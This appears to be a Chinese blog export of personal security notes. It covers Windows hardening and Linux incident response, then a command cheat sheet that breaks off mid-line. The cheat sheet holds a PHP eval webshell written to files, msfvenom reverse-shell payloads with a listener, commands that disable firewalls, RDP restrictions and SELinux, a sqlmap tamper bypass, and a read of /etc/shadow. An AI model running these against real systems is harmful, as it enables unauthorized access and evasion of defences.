<h6 id="日志记录策略设置"><a href="#日志记录策略设置" class="headerlink" title="日志记录策略设置"></a>日志记录策略设置</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的 </span></span><br><span class="line">进入事件查看器</span><br><span class="line">打开运行-&gt;eventvwr.msc</span><br><span class="line">在日志属性中设置日志大小不小于1024KB,设置当达到最大日志尺寸时，按需要改写事件</span><br></pre></td></tr></table></figure>

<h5 id="IP协议安全"><a href="#IP协议安全" class="headerlink" title="IP协议安全"></a>IP协议安全</h5><h6 id="启用TCP-x2F-IP筛选"><a href="#启用TCP-x2F-IP筛选" class="headerlink" title="启用TCP&#x2F;IP筛选"></a>启用TCP&#x2F;IP筛选</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 过滤掉不必要的端口，提高网络安全性</span><br><span class="line">运维人员列出业务所需端口</span><br><span class="line">打开本地连接</span><br><span class="line">	控制面板-&gt;网络连接-&gt;本地连接</span><br><span class="line">找到高级TCP/IP设置</span><br><span class="line">	右击本地连接-&gt;internet协议属性-&gt;高级TCP/IP设置</span><br><span class="line">	在选项的属性中启用网络连接的tcp/IP筛选，是开放业务协议端口</span><br></pre></td></tr></table></figure>

<h6 id="开启系统防火墙"><a href="#开启系统防火墙" class="headerlink" title="开启系统防火墙"></a>开启系统防火墙</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:多角度封堵业务以外的端口连接</span></span><br><span class="line">运维人员列出业务所需端口</span><br><span class="line">打开本地连接中的防火墙</span><br><span class="line">	控制面板-&gt;网络连接-&gt;本地连接</span><br><span class="line">	在高级选项中设置启用windows防火墙</span><br><span class="line">设置例外</span><br><span class="line">	只允许业务端口接入网络</span><br></pre></td></tr></table></figure>

<h6 id="设置空闲超时锁定系统"><a href="#设置空闲超时锁定系统" class="headerlink" title="设置空闲超时锁定系统"></a>设置空闲超时锁定系统</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止由疏忽导致的系统被非法使用</span></span><br><span class="line">进入控制面板-&gt;显示-&gt;屏幕保护程序</span><br><span class="line">启用屏幕保护程序，设置等待时间为5分钟，启用在恢复时使用密码保护功能</span><br></pre></td></tr></table></figure>

<h6 id="设置网络服务挂起时间"><a href="#设置网络服务挂起时间" class="headerlink" title="设置网络服务挂起时间"></a>设置网络服务挂起时间</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止远程登录时由于疏忽导致的系统被非法使用</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">打开安全选项</span><br><span class="line">	本地策略—&gt;安全选项</span><br><span class="line">	<span class="string">&quot;microsoft网络服务器&quot;</span>设置<span class="string">&quot;在挂起会话之前所需空闲时间&quot;</span>为5分钟</span><br></pre></td></tr></table></figure>

<h6 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: windows默认共享分区，关闭后提高信息安全性</span></span><br><span class="line"><span class="comment"># win+r  mmc  可以查看</span></span><br><span class="line">打开注册表编辑器，编辑和新建键值</span><br><span class="line">	打开运行-&gt;regedit.msc</span><br><span class="line">展开lsa目录</span><br><span class="line">	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">	调整Restrictanonymous键值为1</span><br><span class="line">	建两个DWORD值分别命名为AutoShareWks和AutoShareServer</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h6 id="设置共享文件夹权限"><a href="#设置共享文件夹权限" class="headerlink" title="设置共享文件夹权限"></a>设置共享文件夹权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 只允许授权账户访问共享文件夹</span></span><br><span class="line">进入系统工具</span><br><span class="line">	控制面板-&gt;管理工具-&gt;计算机管理</span><br><span class="line">		进入系统工具-&gt;共享文件夹</span><br><span class="line">		查看每个文件夹的共享权限并按需求更改</span><br><span class="line">		在共享权限中删除everyone动态组</span><br></pre></td></tr></table></figure>

<h5 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h5><h6 id="安全系统补丁"><a href="#安全系统补丁" class="headerlink" title="安全系统补丁"></a>安全系统补丁</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:修复系统漏洞，安装最新的service pack补丁集</span></span><br><span class="line">部署wsus服务器</span><br><span class="line">从microsoft update下载补丁</span><br><span class="line">在测试机上安装补丁后测试业务运行情况</span><br><span class="line">使用wsus服务器内网分发补丁</span><br></pre></td></tr></table></figure>

<h6 id="安装和更新杀毒软件"><a href="#安装和更新杀毒软件" class="headerlink" title="安装和更新杀毒软件"></a>安装和更新杀毒软件</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 提高系统防御力，保护关键信息不被破坏</span></span><br><span class="line">在服务器上安装最新版企业防病毒软件的服务端</span><br><span class="line">使用C/S架构部署企业版防病毒软件</span><br><span class="line">制定统一安全查杀规则</span><br></pre></td></tr></table></figure>

<h5 id="windows的服务"><a href="#windows的服务" class="headerlink" title="windows的服务"></a>windows的服务</h5><h6 id="关闭无用服务-1"><a href="#关闭无用服务-1" class="headerlink" title="关闭无用服务"></a>关闭无用服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:关闭不必要的服务，提高系统性能和安全性</span></span><br><span class="line">打开服务管理器</span><br><span class="line">	打开运行-&gt;services.msc</span><br><span class="line">关闭禁用服务</span><br><span class="line">	右击无关服务-&gt;属性-&gt;启动类型(禁用)-&gt;运行状态-&gt;停止</span><br><span class="line">	系统必须服务见附表</span><br></pre></td></tr></table></figure>

<h6 id="关闭无用自启动项"><a href="#关闭无用自启动项" class="headerlink" title="关闭无用自启动项"></a>关闭无用自启动项</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目的: 减少开机自启动服务和软件，提高性能和安全性</span><br><span class="line">打开微软控制台</span><br><span class="line">	打开运行-&gt;msconnfig</span><br><span class="line">	在启动选项卡中去掉多余的启动项的&quot;√&quot;</span><br></pre></td></tr></table></figure>

<h6 id="关闭windows自动播放功能"><a href="#关闭windows自动播放功能" class="headerlink" title="关闭windows自动播放功能"></a>关闭windows自动播放功能</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止从移动存储设备感染自运行病毒</span></span><br><span class="line">打开组策略编辑器</span><br><span class="line">	打开运行-&gt;gpedit.msc</span><br><span class="line">找到策略所在</span><br><span class="line">	计算机配置-&gt;管理模板-&gt;系统-&gt;设置</span><br><span class="line">	关闭自动播放-&gt;已启用</span><br></pre></td></tr></table></figure>





<h4 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h4><p><strong>特征</strong>:文件名   找到直接删，  </p>
<p><strong>时间</strong>：从文件时间入手，去匹配业务日志里面的时间段</p>
<p><strong>流量</strong>：态势感知</p>
<p> 如果是免杀，按照创建时间找，如果改时间，对比哈希值</p>
<p>或者快照，直接回档</p>
<h5 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux </span></span><br><span class="line"><span class="comment"># messages文件记录了操作系统的所有日志消息,内核，进程，服务</span></span><br><span class="line">/var/log/messages</span><br><span class="line"><span class="comment"># syslog日志文件是另一个记录系统日志的文件，组件和服务的消息，smtp、pop、imap</span></span><br><span class="line">/var/log/syslog</span><br><span class="line"><span class="comment"># auth.log日志记录用户认证、授权访问控制的信息</span></span><br><span class="line">/var/log/auth.log</span><br><span class="line"><span class="comment"># kern.log日志记录所有与系统内核相关的事件和消息，内核故障，驱动程序错误，内核崩溃</span></span><br><span class="line">/var/log/kern.log</span><br><span class="line"><span class="comment"># daemon.log日志记录所有与系统demon相关的事件和消息</span></span><br><span class="line">/var/log/daemon.log</span><br><span class="line"><span class="comment"># boot.log日志记录Linux启动过程中的所有日志消息</span></span><br><span class="line">/var/log/boot.log</span><br><span class="line"><span class="comment"># cron日志记录与定时或循环任务相关的所有消息</span></span><br><span class="line">/var/log/cron</span><br><span class="line"><span class="comment"># dmesg记录了通过系统启动信息输出到终端上，包括设备驱动加载、内存信息、设备探测等</span></span><br><span class="line">/var/log/dmesg</span><br><span class="line"><span class="comment"># maillog用于记录与邮件系统及其相关组件相关的所有消息 pop/imap</span></span><br><span class="line">/var/log/maillog</span><br></pre></td></tr></table></figure>

<p>查找 nginx 访问日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>从日志中查找404错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print&#125;&#x27;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>查找大量出现404错误的IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>

<p>防火墙阻止192.168.1.100访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT -s 192.168.1.100 -j DROP</span><br></pre></td></tr></table></figure>

<p>查看ssh登录错误日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>

<p>查找错误登录IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;Failed password&#x27;</span> | awk <span class="string">&#x27; &#123;print $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>

<p>使用 ufw 屏蔽攻击者的 IP   192.168.1.100</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw insert 1 deny from 192.168.1.100 to any</span><br></pre></td></tr></table></figure>



<p>查看ssh登录成功日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd</span><br></pre></td></tr></table></figure>

<p>出现在日志中的用户都是经过ssh登录的,还可以用grep过滤出失败的登录日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd | grep <span class="string">&#x27;Failed password&#x27;</span></span><br></pre></td></tr></table></figure>

<p>查看系统日志，筛选ssh登录记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/syslog | grep sshd</span><br></pre></td></tr></table></figure>

<p>获取登录者的IP地址，以下命令会显示所有失败的登录尝试并指出攻击者的IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;sshd.*Failed password&#x27;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>

<p>使用netstat 验证获取到的ip是否是攻击者ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netstat -anp | grep &lt;IP address&gt;</span><br></pre></td></tr></table></figure>

<h5 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h5><p>内存马排查</p>
<p>查找所有java进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep java</span><br></pre></td></tr></table></figure>

<p>查看每个java进程的所有者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep java</span><br></pre></td></tr></table></figure>

<p>查看java进程参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jps -mlv</span><br></pre></td></tr></table></figure>

<p>查看java进程使用的所有类和包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jmap -histo &lt;PID&gt;</span><br></pre></td></tr></table></figure>

<h5 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h5><p>检查网站目录文件，找所有的.php和.sh文件，并且查找eval函数的使用情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www/public -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.php&quot;</span> -or -iname <span class="string">&quot;*.sh&quot;</span> \) -<span class="built_in">exec</span> grep -iRl <span class="string">&quot;eval&quot;</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>查找后门</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install chkrootkit rkhunter</span><br><span class="line">sudo chkrootkit</span><br><span class="line">sudo rkhunter --check</span><br></pre></td></tr></table></figure>

<p>查找异常文件，最近被修改过的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -<span class="built_in">type</span> f -mtime -7 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找web服务根目录下比较大的文件和目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">du</span> -ah /var/www/ | grep G</span><br></pre></td></tr></table></figure>

<p>找出对用户可写的文件和目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -xdev -<span class="built_in">type</span> d \( -perm -0002 -a ! -perm -1000 \) -<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>找出可执行文件设置了setuid和setgid权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo find / -perm /6000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>

<p>监控网络连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netstat -tnpa | grep ESTABLISHED</span><br></pre></td></tr></table></figure>

<p>看日志文件，wenshell可能被隐藏到日志中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep -i sshd</span><br></pre></td></tr></table></figure>

<h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>检查当前环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>

<p>检查系统环境变量，在&#x2F;etc&#x2F;environment中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/environment</span><br></pre></td></tr></table></figure>

<p>检查shell配置文件，确保每个文件没有添加可疑目录或者路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.bash_profile、/etc/bash.bashrc、/etc/environment</span><br></pre></td></tr></table></figure>

<p>检查LD_PRELOAD变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD</span><br></pre></td></tr></table></figure>

<h5 id="排查系统异常账户"><a href="#排查系统异常账户" class="headerlink" title="排查系统异常账户"></a>排查系统异常账户</h5><p>查看所有系统账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>查看root账户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/passwd | grep &#x27;root&#x27;</span><br></pre></td></tr></table></figure>

<p>检查sudo访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>查看系统特权账户，linux有一些默认特权用户，wheel、adm、root等，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/group | grep -E &quot;root|adm|lp|wheel&quot;</span><br></pre></td></tr></table></figure>

<p>检查ssh登录日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep &#x27; sshd&#x27;</span><br></pre></td></tr></table></figure>

<p>检查登录历史</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<h5 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ls -alR /etc/cron.*</span><br><span class="line">sudo ls -alR /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>















]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>命令</title>
    <url>/2023/06/11/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h5 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g    # generate生成</span><br><span class="line">hexo d    # deploy 推送</span><br></pre></td></tr></table></figure>



<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙和开启3389</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows查找</span></span><br><span class="line">win tasklist /svc /if查找到文件名然后搜索位置，</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找指定目录下指定文件名</span></span><br><span class="line"><span class="built_in">dir</span> C:\ /s /b | find <span class="string">&quot;example.txt&quot;</span></span><br><span class="line"><span class="comment">#bash写入一句话木马</span></span><br><span class="line"><span class="built_in">echo</span> ^&lt;? php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]); ?^&gt; &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> ^&lt;? php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);?^&gt; &gt;&gt; shell.php</span><br><span class="line"><span class="comment">#windows更新延长</span></span><br><span class="line">注册表</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings</span><br><span class="line">新建一个DWORD(32位)值命名为FlightSettingsMaxPauseDays</span><br><span class="line">双击新建的FlightSettingsMaxPauseDays基数改为10进制，左侧数值数据写上你想暂停更新的天数，点击确定</span><br><span class="line">在windows更新中选择暂停时间，可选择刚才设置的时间</span><br></pre></td></tr></table></figure>

<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_15131581/article/details/127452844</span><br><span class="line"></span><br><span class="line">#生成payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=2333 -f py</span><br><span class="line">生成elf木马</span><br><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=8888 -f elf &gt; mshell.elf</span><br><span class="line"></span><br><span class="line">#监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0  </span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br><span class="line">#上传</span><br><span class="line">upload //root//fscan_386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>proxychains安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">添加socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<p>sqlmap   用友ehr绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://x.x.x.x/servlet/codesettree?categories=1&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1&quot;  -p categories --dbms=&quot;Microsoft SQL Server&quot; --tamper ehr_SafeCodeEncode_tamper --level 3</span><br></pre></td></tr></table></figure>



<p>docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入容器内部</span><br><span class="line">docker exec -it &lt;id&gt;   /bin/bash</span><br><span class="line"> #查看docker状态</span><br><span class="line">docker container ls    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#检测是否在docker中</span><br><span class="line"> # 是否存在此文件</span><br><span class="line"> ls -al /.dockerenv</span><br><span class="line"></span><br><span class="line"> # 在其中是否包含docker字符串</span><br><span class="line"> cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<h5 id="gtihub搜索语法"><a href="#gtihub搜索语法" class="headerlink" title="gtihub搜索语法:"></a>gtihub搜索语法:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:name baidu       #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu     #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu       #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu      #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu   #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu      #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu   #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu      #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu  #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu  #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name         #用户名搜素</span><br><span class="line">license:apache-2.0 baidu  #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu     #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu   #组合搜索,用户名baidu的标题含有baidu的</span><br></pre></td></tr></table></figure>



<h5 id="webrtc"><a href="#webrtc" class="headerlink" title="webrtc"></a>webrtc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#火狐浏览器</span><br><span class="line">about:config，将media.peerconnection.enabled值改为false；</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;WebRTC泄露检测&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function findIP(onNewIP) &#123;</span><br><span class="line">        var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;</span><br><span class="line">        var pc = new myPeerConnection(&#123;iceServers: [&#123;urls: &quot;stun:stun.l.google.com:19302&quot;&#125;]&#125;),</span><br><span class="line">        noop = function() &#123;&#125;,</span><br><span class="line">        localIPs = &#123;&#125;,</span><br><span class="line">        ipRegex = /([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/g,</span><br><span class="line">        key;</span><br><span class="line"></span><br><span class="line">        function ipIterate(ip) &#123;</span><br><span class="line">          if (!localIPs[ip]) onNewIP(ip);</span><br><span class="line">          localIPs[ip] = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pc.createDataChannel(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        pc.createOffer(function(sdp) &#123;</span><br><span class="line">          sdp.sdp.split(&#x27;\n&#x27;).forEach(function(line) &#123;</span><br><span class="line">            if (line.indexOf(&#x27;candidate&#x27;) &lt; 0) return;</span><br><span class="line">            line.match(ipRegex).forEach(ipIterate);</span><br><span class="line">          &#125;);</span><br><span class="line">          pc.setLocalDescription(sdp, noop, noop);</span><br><span class="line">        &#125;, noop);</span><br><span class="line"></span><br><span class="line">        pc.onicecandidate = function(ice) &#123;</span><br><span class="line">          if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;</span><br><span class="line">          ice.candidate.candidate.match(ipRegex).forEach(ipIterate);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function show(ip) &#123;</span><br><span class="line">        alert(ip);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      findIP(show);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><p>less和more类似,但是使用less可以随意浏览文件,而more仅能向前移动,却不能向后移动,more启动时会加载整个文件。而且less在查看之前不会加载整个文件  </p>
<h6 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h6><p>用来处理文本，将文本按照指定的格式输出。其中包含了变量，循环以及数组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]#awk -F: &#x27;&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h6 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h6><p>进去容器中</p>
<p>docker exec -it  <id> &#x2F;bin&#x2F;bash</p>
<p>关闭所有容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure>



<h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><p>-sn   基础主机发现</p>
<p>-sc  默认脚本</p>
<p>–script&#x3D;vuln 脚本扫描    脚本路径在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts</p>
<p>– ssl-enum-ciphers    ssl版本漏洞</p>
<p>-pn &#x2F;-p0   无ping扫描</p>
<h6 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入一句话木马</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#x27;</span> &gt; 1.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#x27;</span> &gt;&gt; 1.php</span><br><span class="line"><span class="comment">#查找指定目录的指定文件名</span></span><br><span class="line">find /root -name <span class="string">&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找8080端口所对应的服务</span></span><br><span class="line">lsof -i :8080</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux查找文件进程</span></span><br><span class="line">linux查找文件进程后可以用tree进程树查找最后定位到文件。win 定位后管理器查看进程文件位置。</span><br><span class="line">Linux lsof直接就可以看</span><br><span class="line"><span class="comment">#乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span 